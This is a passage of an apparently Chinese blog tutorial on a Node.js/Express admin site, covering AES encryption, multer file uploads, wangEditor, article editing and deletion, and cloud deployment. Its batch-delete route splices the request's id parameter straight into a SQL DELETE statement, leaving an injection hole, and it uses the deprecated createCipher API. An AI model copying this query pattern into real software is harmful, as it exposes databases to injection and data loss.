class="token punctuation">(</span><span class="token string">'aes192'</span><span class="token punctuation">,</span> <span class="token string">'私钥'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> encrypted <span class="token operator">=</span> cipher<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token string">'要加密的数据'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">,</span> <span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>encrypted <span class="token operator">+</span><span class="token operator">=</span> cipher<span class="token punctuation">.</span><span class="token function">final</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Prints: ca981be48e90867604588e75d04feabb63cc007a8f8ad89b10616ed84d815504</span></code></pre><p>解密：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> decipher <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">createDecipher</span><span class="token punctuation">(</span><span class="token string">'aes192'</span><span class="token punctuation">,</span> <span class="token string">'私钥'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> encrypted <span class="token operator">=</span>    <span class="token string">'要解密的数据'</span><span class="token punctuation">;</span><span class="token keyword">let</span> decrypted <span class="token operator">=</span> decipher<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> <span class="token string">'hex'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>decrypted <span class="token operator">+</span><span class="token operator">=</span> decipher<span class="token punctuation">.</span><span class="token function">final</span><span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>decrypted<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Prints: some clear text data</span></code></pre><h4 id="文章管理"><a href="#文章管理" class="headerlink" title="文章管理"></a>文章管理</h4><h6 id="添加文章"><a href="#添加文章" class="headerlink" title="添加文章"></a>添加文章</h6><p>一、客户端表单提交（带有文件的POST请求）处理</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">handleSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 1. 获取表单数据</span>  <span class="token comment" spellcheck="true">// multipart/form-data</span>  <span class="token keyword">var</span> formEl <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'##new_form'</span><span class="token punctuation">)</span>  <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span>formEl<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 2. 表单提交</span>  $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    url<span class="token punctuation">:</span> <span class="token string">'/api/posts/create'</span><span class="token punctuation">,</span>    type<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>    data<span class="token punctuation">:</span> formData<span class="token punctuation">,</span>    processData<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 不处理数据</span>    contentType<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">// 不设置内容类型</span>    success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>resData<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 3. 根据响应结果做后续处理</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>resData<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    error<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">}</span></code></pre><p>二、服务端接口处理</p><ol><li>express 本身不处理文件上传</li><li>使用 <a href="">multer</a> 处理带有文件的表单 POST 请求</li></ol><p>基本用法：（try-try-see）</p><ol><li>安装</li></ol><pre class=" language-javascript"><code class="language-javascript">npm i multer</code></pre><ol start="2"><li>基本示例</li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">var</span> multer  <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'multer'</span><span class="token punctuation">)</span><span class="token keyword">var</span> upload <span class="token operator">=</span> <span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">{</span> dest<span class="token punctuation">:</span> <span class="token string">'uploads/'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 指定上传文件的存储路径</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// /profile 是带有文件的 POST 请求，使用 multer 解析文件上传</span><span class="token comment" spellcheck="true">// upload.single() 需要给定一个参数：告诉multer，请求体中哪个字段是文件</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/profile'</span><span class="token punctuation">,</span> upload<span class="token punctuation">.</span><span class="token function">single</span><span class="token punctuation">(</span><span class="token string">'avatar'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// req.file 是 `avatar` 文件的相关信息（原本的文件名，新的唯一名称，文件保存路径，文件大小...)</span>  <span class="token comment" spellcheck="true">// req.body 是请求体中的那些普通的文本字段</span>  <span class="token comment" spellcheck="true">// 数据库中不存储文件，文件还是存储在磁盘上，数据库中存储文件在我们 Web 服务中的 url 资源路径</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><ol start="3"><li>multer 保存的文件默认没有后缀名，如果需要的话，就需要下面这样来使用</li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> storage <span class="token operator">=</span> multer<span class="token punctuation">.</span><span class="token function">diskStorage</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 可以动态处理文件的保存路径</span>  destination<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">'/tmp/my-uploads'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 动态的处理保存的文件名</span>  filename<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span>fieldname <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 这里的关键是这个时间戳，能保证文件名的唯一性（不严谨）</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">var</span> upload <span class="token operator">=</span> <span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">{</span> storage<span class="token punctuation">:</span> storage <span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/profile'</span><span class="token punctuation">,</span> upload<span class="token punctuation">.</span><span class="token function">single</span><span class="token punctuation">(</span><span class="token string">'avatar'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// req.file 是 `avatar` 文件的相关信息（原本的文件名，新的唯一名称，文件保存路径，文件大小...)</span>  <span class="token comment" spellcheck="true">// req.body 是请求体中的那些普通的文本字段</span>  <span class="token comment" spellcheck="true">// 数据库中不存储文件，文件还是存储在磁盘上，数据库中存储文件在我们 Web 服务中的 url 资源路径</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><ol start="4"><li>处理多文件</li></ol><p>有多个名字都一样的 file 类型的 input</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/photos/upload'</span><span class="token punctuation">,</span> upload<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'photos'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// req.files is array of `photos` files</span>  <span class="token comment" spellcheck="true">// req.body will contain the text fields, if there were any</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>处理多个不同名字的 file 类型的 input：</p><pre class=" language-java"><code class="language-java">var cpUpload <span class="token operator">=</span> upload<span class="token punctuation">.</span><span class="token function">fields</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">{</span> name<span class="token operator">:</span> <span class="token string">'avatar'</span><span class="token punctuation">,</span> maxCount<span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> name<span class="token operator">:</span> <span class="token string">'gallery'</span><span class="token punctuation">,</span> maxCount<span class="token operator">:</span> <span class="token number">8</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/cool-profile'</span><span class="token punctuation">,</span> cpUpload<span class="token punctuation">,</span> <span class="token function">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// req.files is an object (String -> Array) where fieldname is the key, and the value is array of files</span>  <span class="token comment" spellcheck="true">//</span>  <span class="token comment" spellcheck="true">// e.g.</span>  <span class="token comment" spellcheck="true">//  req.files['avatar'][0] -> File</span>  <span class="token comment" spellcheck="true">//  req.files['gallery'] -> Array</span>  <span class="token comment" spellcheck="true">//</span>  <span class="token comment" spellcheck="true">// req.body will contain the text fields, if there were any</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>######## 富文本编辑器 wangEditor</p><p>常见的富文本编辑器：</p><ul><li><a href="https://ueditor.baidu.com/website/" target="_blank" rel="noopener">Ueditor</a></li><li><a href="https://ckeditor.com/" target="_blank" rel="noopener">CKeditor</a></li><li><a href="https://quilljs.com/" target="_blank" rel="noopener">Quill</a></li><li><a href="http://www.wangeditor.com/" target="_blank" rel="noopener">wangEditor</a></li><li>太多了…</li></ul><p>这里我们以使用 wangEditor 为例：</p><ul><li>github 仓库地址：<a href="https://github.com/wangfupeng1988/wangEditor" target="_blank" rel="noopener">https://github.com/wangfupeng1988/wangEditor</a></li><li>官网：<a href="http://www.wangeditor.com/" target="_blank" rel="noopener">http://www.wangeditor.com/</a></li><li>使用文档：<a href="http://www.kancloud.cn/wangfupeng/wangeditor3/332599" target="_blank" rel="noopener">http://www.kancloud.cn/wangfupeng/wangeditor3/332599</a></li><li>下载</li><li>使用</li><li>配置</li></ul><p>富文本编辑器图片上传</p><p><img src="/images/1551870035033.png" alt="1551870035033"></p><h6 id="文章列表"><a href="#文章列表" class="headerlink" title="文章列表"></a>文章列表</h6><h6 id="批量删除文章"><a href="#批量删除文章" class="headerlink" title="批量删除文章"></a>批量删除文章</h6><p>客户端</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">handleBatchDelete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>window<span class="token punctuation">.</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">'确认删除吗?'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 1. 找到所有选中行的数据项 id</span>  <span class="token keyword">var</span> ids <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'##posts_container tr input[name=checkbox1]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>index<span class="token punctuation">,</span> item<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span>checked<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// $(item).data('id')</span>      ids<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>id<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 2. 发请求，等待响应</span>  $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    url<span class="token punctuation">:</span> <span class="token string">'/api/posts/delete'</span><span class="token punctuation">,</span>    method<span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>    data<span class="token punctuation">:</span> <span class="token punctuation">{</span>      id<span class="token punctuation">:</span> ids<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    dataType<span class="token punctuation">:</span> <span class="token string">'json'</span><span class="token punctuation">,</span>    success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>resData<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>resData<span class="token punctuation">.</span>success<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 刷新当前网页，重新渲染数据列表</span>        window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    error<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 3. 根据响应结果进行后续处理</span><span class="token punctuation">}</span></code></pre><p>数据接口</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">/** * 批量删除文章 */</span>router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/api/posts/delete'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 1. 获取要删除的数据 id</span>  <span class="token keyword">const</span> <span class="token punctuation">{</span> id <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 1,2,3,4,5</span>  <span class="token comment" spellcheck="true">// 2. 数据库操作</span>  db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`DELETE FROM ali_article WHERE article_id IN(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)`</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> ret<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 3. 发送响应</span>    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      success<span class="token punctuation">:</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="编辑文章"><a href="#编辑文章" class="headerlink" title="编辑文章"></a>编辑文章</h6><p>######## 动态显示编辑文章页面</p><p>这里我们可以直接使用服务端渲染的方式动态渲染编辑文章页面</p><pre class=" language-javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/admin/posts/edit'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT * FROM `ali_article` WHERE `article_id`=?'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>id<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> ret<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT * FROM `ali_cate`'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> categories<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>      <span class="token punctuation">}</span>      res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin/posts-edit.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        post<span class="token punctuation">:</span> ret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 文章详情</span>        categories <span class="token comment" spellcheck="true">// 分类列表</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>然后在 <code>posts-edit.html</code> 页面绑定 <code>post</code> 和 <code>categories</code> 数据。</p><p>######## 提交编辑</p><p>客户端</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">handleAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'##add_form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 方式1，自己拼</span>  formData <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">'&amp;article_body='</span> <span class="token operator">+</span> editor<span class="token punctuation">.</span>txt<span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 方式2：将富文本编辑器的容器改为 textarea</span>  <span class="token comment" spellcheck="true">//        参考文档：https://www.kancloud.cn/wangfupeng/wangeditor3/430149</span>  $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    url<span class="token punctuation">:</span> <span class="token string">'/api/posts/edit?id='</span> <span class="token operator">+</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'##article_id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>    data<span class="token punctuation">:</span> formData<span class="token punctuation">,</span>    dataType<span class="token punctuation">:</span> <span class="token string">'json'</span><span class="token punctuation">,</span>    success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>resData<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>resData<span class="token punctuation">.</span>success<span class="token punctuation">)</span> <span class="token punctuation">{</span>        window<span class="token punctuation">.</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'修改成功'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    error<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>没有选新文件的表单提交</p><p><img src="/images/1552019045020.png" alt="1552019045020"></p><p>有文件的表单数据</p><p><img src="/images/1552019250524.png" alt="1552019250524"></p><p>最后，在接口中就判断是否有 new_file，如果有就用，如果没有就用 盘original_file。</p><p>服务端处理</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">/** * 编辑文章 */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/api/posts/edit'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">{</span> id <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query  <span class="token keyword">const</span> body <span class="token operator">=</span> req<span class="token punctuation">.</span>body  db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>    <span class="token string">'UPDATE `ali_article` SET `article_title`=?, `article_body`=?, `article_cateid`=?, `article_slug`=?, `article_addtime`=?, `article_status`=?, `article_file`=? WHERE `article_id`=?'</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span>      body<span class="token punctuation">.</span>article_title<span class="token punctuation">,</span>      body<span class="token punctuation">.</span>article_body<span class="token punctuation">,</span>      body<span class="token punctuation">.</span>article_cateid<span class="token punctuation">,</span>      body<span class="token punctuation">.</span>article_slug<span class="token punctuation">,</span>      body<span class="token punctuation">.</span>article_addtime<span class="token punctuation">,</span>      body<span class="token punctuation">.</span>article_status<span class="token punctuation">,</span>      body<span class="token punctuation">.</span>new_file <span class="token operator">||</span> body<span class="token punctuation">.</span>original_file<span class="token punctuation">,</span>      id    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span>err<span class="token punctuation">,</span> ret<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>      <span class="token punctuation">}</span>      res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        success<span class="token punctuation">:</span> <span class="token boolean">true</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h6><h4 id="网站设置"><a href="#网站设置" class="headerlink" title="网站设置"></a>网站设置</h4><h4 id="个人中心"><a href="#个人中心" class="headerlink" title="个人中心"></a>个人中心</h4><h4 id="轮播广告管理"><a href="#轮播广告管理" class="headerlink" title="轮播广告管理"></a>轮播广告管理</h4><h4 id="发布上线"><a href="#发布上线" class="headerlink" title="发布上线"></a>发布上线</h4><ul><li><p>24 小时不关机的电脑</p><ul><li>云服务</li></ul></li><li><p>服务器操作系统</p><ul><li>Windows（Windows Server / win7 / win10）</li><li><strong>Linux</strong>（CentOS / Ubuntu / Redhat）</li></ul></li><li><p>云服务</p><ul><li>阿里云</li><li>腾讯云</li><li>…</li></ul></li><li><p>Web 服务器软件</p></li><li><p>项目源代码</p></li><li><p>域名（不是必须）</p></li></ul><h6 id="服务器购买及配置"><a href="#服务器购买及配置" class="headerlink" title="服务器购买及配置"></a>服务器购买及配置</h6><ul><li><p><a href="https://www.aliyun.com/" target="_blank" rel="noopener">阿里云</a></p></li><li><p>云服务器 ECS</p></li><li><p>乞丐版</p></li><li><p>操作系统选择：Linux</p><ul><li>CentOS、<strong>Ubuntu</strong>、Fedora、….</li></ul></li><li><p>在购买好的主机的后台管理系统中，会告诉你这个机器的</p><ul><li>ip地址</li><li>连接端口号</li><li>默认是 root 用户</li><li>密码由你自己设定</li></ul></li><li><p>备案</p><ul><li>香港节点不用备案</li></ul></li></ul><h6 id="连接到远程服务器"><a href="#连接到远程服务器" class="headerlink" title="连接到远程服务器"></a>连接到远程服务器</h6><p>SSH主要用于远程登录。假定你要以用户名user，登录远程主机host，只要一条简单命令就可以了。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> user@host</code></pre><p>如果本地用户名与远程用户名一致，登录时可以省略用户名。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> host</code></pre><p>SSH的默认端口是22，也就是说，你的登录请求会送进远程主机的22端口。使用p参数，可以修改这个端口。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -p 2222 user@host</code></pre><p>上面这条命令表示，ssh直接连接远程主机的2222端口。</p><h6 id="安装及配置-Web-服务器软件"><a href="#安装及配置-Web-服务器软件" class="headerlink" title="安装及配置 Web 服务器软件"></a>安装及配置 Web 服务器软件</h6><p>让服务运行在后台，注意，</p><ul><li>forever</li><li>pm2</li></ul><h6 id="上传网站到服务器"><a href="#上传网站到服务器" class="headerlink" title="上传网站到服务器"></a>上传网站到服务器</h6><ul><li>把代码传到 github 或者 码云之类的云仓库</li><li>服务端使用 git  去下载和更新你的源代码</li></ul><h6 id="域名购买及解析"><a href="#域名购买及解析" class="headerlink" title="域名购买及解析"></a>域名购买及解析</h6><p>ip地址</p><ul><li><p>买域名</p></li><li><p>配置域名指向你的服务器 ip 地址</p></li></ul><h6 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h6><ul><li>多个网站服务</li><li>一个网站服务对应一个域名</li><li>80 端口号只能被占用一次</li><li>如果想要在一台计算机上提供多个网站服务，如何都使用 80 端口号</li><li>配置反向代理服务器</li><li>三个网站<ul><li><a href="http://www.a.com" target="_blank" rel="noopener">www.a.com</a>  192.168.1.125:80</li><li><a href="http://www.b.com" 